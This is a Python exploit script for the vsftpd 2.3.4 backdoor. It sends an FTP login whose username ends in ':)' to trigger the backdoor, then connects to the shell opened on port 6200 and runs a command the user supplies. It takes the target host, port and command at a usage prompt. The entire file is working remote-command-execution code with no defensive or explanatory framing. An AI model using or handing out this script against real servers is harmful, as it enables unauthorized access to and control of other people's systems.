import socket
import time

# This exploit takes advantage of a backdoor issued in the vsftp version 2.3.4. It is exploited by connecting with a username that 
# ends with a :), this will open a shell on port 6200
def exploit(ip, port, command):

    # Here, we will try to attempt the backdoor by using the username ending in ':)'
    try:
        print('Attempting Backdoor')

        # Establish a connection to the remote host by logging into the ftp server
        # Using a with statement automatically closes the socket when we are done
        with socket.create_connection((ip, port), timeout=3) as ftpSock:

            # send as bytes
            ftpSock.sendall(b'USER EasyAccess:)\n')
            ftpSock.sendall(b'PASS ThankYou\n')

        # wait two seconds
        time.sleep(2)

        print('Triggered Backdoor')

    except Exception as e:
        print(f'Failed to trigger backdoor on {ip}: {e}')
        return

    # This tries to connect to the port that was opened due to the exploit
    try:
        print('Attempting to connect')

        # Create the connection to the opened port
        with socket.create_connection((ip, 6200), timeout=5) as bdSock:
            print(f'Connected to backdoor')

            # send the encoded commands to the remote host
            bdSock.sendall(command.encode() + b'\n')
            # decode the recieved response
            response = bdSock.recv(1024).decode('utf-8')
            print(f'Response:\n{response}')

    except Exception as e:
        print(f'Failed to connect to backdoor port')


if __name__ == '__main__':
    print("vsftpd 2.3.4 backdoor")

    # Prompts user for input
    userInput = input("Usage: <RHOST> <RPORT> <COMMAND>\n")

    while len(userInput.split()) != 3:
        print("Incorrect Input")
        userInput = input("Usage: <RHOST> <RPORT> <COMMAND>\n")

    # Split the input from the command line into the correct vars
    splitInput = userInput.split()

    print("Attempting Exploit")

    rhost = splitInput[0]
    rport = splitInput[1]
    command = splitInput[2]

    exploit(rhost, rport, command)
